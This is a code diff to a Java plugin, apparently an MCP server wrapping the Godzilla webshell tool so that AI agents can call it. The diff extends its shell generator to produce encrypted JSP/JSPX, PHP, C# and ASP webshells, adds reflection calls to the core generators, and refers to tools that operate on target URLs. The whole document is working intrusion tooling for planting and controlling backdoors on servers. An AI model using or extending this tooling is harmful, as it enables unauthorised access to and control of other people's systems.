@@ -33,7 +33,7 @@ import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.Executors;
 
 /**
- * Godzilla-MCP Headless Edition v1.2.0
+ * Godzilla-MCP Headless Edition v1.2.1
  * ====================================
  * 基于 hkdonline/Godzilla-MCP（上游改版自 cns1rius/godzilla-mcp）修改，感谢原作者。
  *
@@ -62,7 +62,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
 
     private static final String PROTOCOL_VERSION = "2024-11-05";
     private static final String SERVER_NAME = "godzilla-mcp";
-    private static final String SERVER_VERSION = "1.2.0";
+    private static final String SERVER_VERSION = "1.2.1";
     private static final SimpleDateFormat LOG_DATE_FMT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
     private static PrintWriter logWriter = null;
 
@@ -582,17 +582,19 @@ public class GodzillaMcpServerPlugin implements Plugin {
                     )));
 
             tools.add(buildToolDef("get_env_config",
-                    "获取当前支持的 Payload 和加密方式列表",
+                    "获取当前支持的 Payload 与加密方式列表（实时读取哥斯拉核心注册表）",
                     buildSchema()));
 
             tools.add(buildToolDef("generate_shell",
-                    "生成哥斯拉 Webshell 文件（JSP/PHP）。cryption 支持 JAVA_AES_BASE64 / JAVA_AES_RAW / PHP_XOR_BASE64 / PHP_XOR_RAW",
-                    buildSchema(
-                            strProp("cryption", "加密方式: JAVA_AES_BASE64 | JAVA_AES_RAW | PHP_XOR_BASE64 | PHP_XOR_RAW"),
+                    "生成哥斯拉 Webshell 文件（JSP / PHP / C# / ASP 全系）。可选 suffix：JSP 用 jsp/jspx（默认 jsp）；C# 用 aspx/asmx/ashx（默认 aspx）",
+                    buildSchemaEx(new String[][]{
+                            strProp("cryption", "加密方式: JAVA_AES_BASE64/RAW, PHP_XOR_BASE64/RAW, PHP_EVAL_XOR_BASE64, CSHAP_AES_BASE64/RAW, CSHAP_ASMX_AES_BASE64, CSHAP_EVAL_AES_BASE64, ASP_XOR_BASE64/RAW, ASP_BASE64/RAW, ASP_EVAL_BASE64"),
                             strProp("password", "连接密码"),
                             strProp("secretKey", "加密密钥"),
                             strProp("outputPath", "本地输出文件路径，例如 /tmp/shell.jsp")
-                    )));
+                    }, new String[][]{
+                            strProp("suffix", "后缀（可选）：JSP -> jsp/jspx（默认 jsp）；C# -> aspx/asmx/ashx（默认 aspx）")
+                    })));
 
             // ===== 靶机操作类工具（需要 targetUrl）=====
             tools.add(buildToolDef("get_basics_info",
@@ -840,8 +842,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
                     resultText = generateShell(arguments);
                     break;
                 case "get_env_config":
-                    resultText = "{\"payloads\":[\"JavaDynamicPayload\",\"PhpDynamicPayload\",\"CShrapDynamicPayload\"]," +
-                            "\"cryptions\":[\"JAVA_AES_BASE64\",\"PHP_XOR_BASE64\",\"CSHARP_AES_BASE64\"]}";
+                    resultText = getEnvConfig();
                     break;
                 // 靶机操作
                 case "get_basics_info":
@@ -1015,8 +1016,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
 
                 switch (action) {
                     case "getEnvConfig":
-                        resultData = "{\"payloads\":[\"JavaDynamicPayload\",\"PhpDynamicPayload\",\"CShrapDynamicPayload\"], " +
-                                "\"cryptions\":[\"JAVA_AES_BASE64\",\"PHP_XOR_BASE64\",\"CSHARP_AES_BASE64\"]}";
+                        resultData = getEnvConfig();
                         break;
                     case "listShells":
                         resultData = getShellList();
@@ -1102,20 +1102,47 @@ public class GodzillaMcpServerPlugin implements Plugin {
             String password = requireParam(params, "password");
             String secretKey = requireParam(params, "secretKey");
             String outputPath = requireParam(params, "outputPath");
+            String suffix = optString(params, "suffix", null);
             byte[] data;
             if ("JAVA_AES_BASE64".equals(cryption) || "JAVA_AES_RAW".equals(cryption)) {
-                // [headless patch] 与 JavaAesBase64.generate 一致：AES 密钥 = md5(secretKey)[0:16]
+                // 与 JavaAesBase64.generate 一致：AES 密钥 = md5(secretKey)[0:16]；suffix: jsp / jspx
+                String sfx = (suffix == null || suffix.isEmpty()) ? "jsp" : suffix;
+                if (!"jsp".equals(sfx) && !"jspx".equals(sfx)) {
+                    throw new Exception("JSP 后缀仅支持 jsp / jspx");
+                }
                 String derivedKey = util.functions.md5(secretKey);
                 derivedKey = derivedKey.substring(0, Math.min(16, derivedKey.length()));
-                data = buildJavaShell("JAVA_AES_RAW".equals(cryption), password, derivedKey);
+                data = buildJavaShell("JAVA_AES_RAW".equals(cryption), password, derivedKey, sfx);
             } else if ("PHP_XOR_BASE64".equals(cryption) || "PHP_XOR_RAW".equals(cryption)) {
-                // [headless patch] 与 PhpXor.generate 一致：XOR 密钥 = md5(secretKey)[0:16]
+                // 与 PhpXor.generate 一致：XOR 密钥 = md5(secretKey)[0:16]
                 String derivedKey = util.functions.md5(secretKey);
                 derivedKey = derivedKey.substring(0, Math.min(16, derivedKey.length()));
                 data = buildPhpShell("PHP_XOR_RAW".equals(cryption), password, derivedKey);
+            } else if ("PHP_EVAL_XOR_BASE64".equals(cryption)) {
+                // eval 变体无弹窗，直接调用核心生成器（与 GUI 完全一致）
+                data = callCryptionGenerate("shells.cryptions.phpXor.PhpEvalXor", password, secretKey);
+            } else if ("CSHAP_AES_BASE64".equals(cryption) || "CSHAP_AES_RAW".equals(cryption)) {
+                // 与 CShapAesBase64/Raw.generate 一致（原版带“选后缀”弹窗，此处按 suffix 直接组装）；suffix: aspx / asmx / ashx
+                String sfx = (suffix == null || suffix.isEmpty()) ? "aspx" : suffix;
+                if (!"aspx".equals(sfx) && !"asmx".equals(sfx) && !"ashx".equals(sfx)) {
+                    throw new Exception("C# 后缀仅支持 aspx / asmx / ashx");
+                }
+                data = buildCsharpShell("CSHAP_AES_RAW".equals(cryption), password, secretKey, sfx);
+            } else if ("CSHAP_ASMX_AES_BASE64".equals(cryption)) {
+                // asmx 变体无弹窗，直接调用核心生成器（与 GUI 完全一致）
+                data = callCryptionGenerate("shells.cryptions.cshapAes.CShapAsmxAesBase64", password, secretKey);
+            } else if ("CSHAP_EVAL_AES_BASE64".equals(cryption)) {
+                data = callCryptionGenerate("shells.cryptions.cshapAes.CSharpEvalAesBase64", password, secretKey);
+            } else if ("ASP_XOR_BASE64".equals(cryption) || "ASP_XOR_RAW".equals(cryption)
+                    || "ASP_BASE64".equals(cryption) || "ASP_RAW".equals(cryption)
+                    || "ASP_EVAL_BASE64".equals(cryption)) {
+                // ASP 全系生成器无 GUI 依赖，直接调用核心生成器（与 GUI 完全一致）
+                data = callCryptionGenerate("shells.cryptions.aspXor." + aspCryptionClass(cryption), password, secretKey);
             } else {
                 throw new Exception("Unsupported cryption: " + cryption
-                        + " (supported: JAVA_AES_BASE64, JAVA_AES_RAW, PHP_XOR_BASE64, PHP_XOR_RAW)");
+                        + " (supported: JAVA_AES_BASE64, JAVA_AES_RAW, PHP_XOR_BASE64, PHP_XOR_RAW, "
+                        + "CSHAP_AES_BASE64, CSHAP_AES_RAW, CSHAP_ASMX_AES_BASE64, CSHAP_EVAL_AES_BASE64, "
+                        + "PHP_EVAL_XOR_BASE64, ASP_XOR_BASE64, ASP_XOR_RAW, ASP_BASE64, ASP_RAW, ASP_EVAL_BASE64)");
             }
             java.io.File out = new java.io.File(outputPath);
             if (out.getParentFile() != null && !out.getParentFile().exists()) {
@@ -1124,26 +1151,82 @@ public class GodzillaMcpServerPlugin implements Plugin {
             java.io.FileOutputStream fos = new java.io.FileOutputStream(out);
             fos.write(data);
             fos.close();
-            log("[MCP] generated shell: " + cryption + " -> " + out.getAbsolutePath() + " (" + data.length + " bytes)");
-            return "✓ Generated shell (" + cryption + ")\nPath: " + out.getAbsolutePath() + "\nSize: " + data.length + " bytes";
+            log("[MCP] generated shell: " + cryption + (suffix != null ? ("/" + suffix) : "") + " -> " + out.getAbsolutePath() + " (" + data.length + " bytes)");
+            return "✓ Generated shell (" + cryption + (suffix != null ? ("/" + suffix) : "") + ")\nPath: " + out.getAbsolutePath() + "\nSize: " + data.length + " bytes";
         }
-
-        private byte[] buildJavaShell(boolean isBin, String pass, String secretKey) throws Exception {
+        private byte[] buildJavaShell(boolean isBin, String pass, String secretKey, String suffix) throws Exception {
             String variant = isBin ? "raw" : "base64";
             String globalCode = readRes("/shells/cryptions/JavaAes/template/" + variant + "GlobalCode.bin");
             String code = readRes("/shells/cryptions/JavaAes/template/" + variant + "Code.bin");
             globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
             code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
-            String template = readRes("/shells/cryptions/JavaAes/template/shell.jsp");
+            if ("jspx".equals(suffix)) {
+                globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
+                code = code.replace("<", "&lt;").replace(">", "&gt;");
+            }
+            String template = readRes("/shells/cryptions/JavaAes/template/shell." + suffix);
             template = template.replace("{globalCode}", globalCode).replace("{code}", code);
             return template.getBytes(StandardCharsets.UTF_8);
         }
-
         private byte[] buildPhpShell(boolean isBin, String pass, String secretKey) throws Exception {
             String code = readRes("/shells/cryptions/phpXor/template/" + (isBin ? "raw.bin" : "base64.bin"));
             code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
             code = util.TemplateEx.run(code);
             return code.getBytes(StandardCharsets.UTF_8);
+        }
+
+        private byte[] buildCsharpShell(boolean isBin, String pass, String secretKey, String suffix) throws Exception {
+            // 与 Generate.GenerateShellLoder(shellName="", pass, md5(secretKey)[0:16], isBin) 一致（去掉后缀弹窗）
+            String derivedKey = util.functions.md5(secretKey);
+            derivedKey = derivedKey.substring(0, Math.min(16, derivedKey.length()));
+            String code = readRes("/shells/cryptions/cshapAes/template/" + (isBin ? "raw" : "base64") + ".bin");
+            code = code.replace("{pass}", pass).replace("{secretKey}", derivedKey);
+            String template = readRes("/shells/cryptions/cshapAes/template/shell." + suffix);
+            template = template.replace("{code}", code);
+            return template.getBytes(StandardCharsets.UTF_8);
+        }
+
+        private byte[] callCryptionGenerate(String className, String password, String secretKey) throws Exception {
+            Class<?> c = Class.forName(className);
+            java.lang.reflect.Constructor<?> ctor = c.getDeclaredConstructor();
+            ctor.setAccessible(true);
+            Object inst = ctor.newInstance();
+            java.lang.reflect.Method m = c.getMethod("generate", String.class, String.class);
+            m.setAccessible(true);
+            Object out = m.invoke(inst, password, secretKey);
+            if (out == null) {
+                throw new Exception("核心生成器返回 null: " + className);
+            }
+            return (byte[]) out;
+        }
+
+        private static String aspCryptionClass(String cryption) {
+            if ("ASP_XOR_BASE64".equals(cryption)) return "AspXorBae64";
+            if ("ASP_XOR_RAW".equals(cryption)) return "AspXorRaw";
+            if ("ASP_BASE64".equals(cryption)) return "AspBase64";
+            if ("ASP_RAW".equals(cryption)) return "AspRaw";
+            return "AspEvalBase64";
+        }
+
+        private String getEnvConfig() {
+            JsonObject result = new JsonObject();
+            JsonArray payloads = new JsonArray();
+            JsonObject cryptions = new JsonObject();
+            try {
+                for (String p : core.ApplicationContext.getAllPayload()) {
+                    payloads.add(p);
+                    JsonArray arr = new JsonArray();
+                    for (String c : core.ApplicationContext.getAllCryption(p)) {
+                        arr.add(c);
+                    }
+                    cryptions.add(p, arr);
+                }
+            } catch (Throwable t) {
+                result.addProperty("error", String.valueOf(t));
+            }
+            result.add("payloads", payloads);
+            result.add("cryptions", cryptions);
+            return result.toString();
         }
 
         private String readRes(String path) throws Exception {
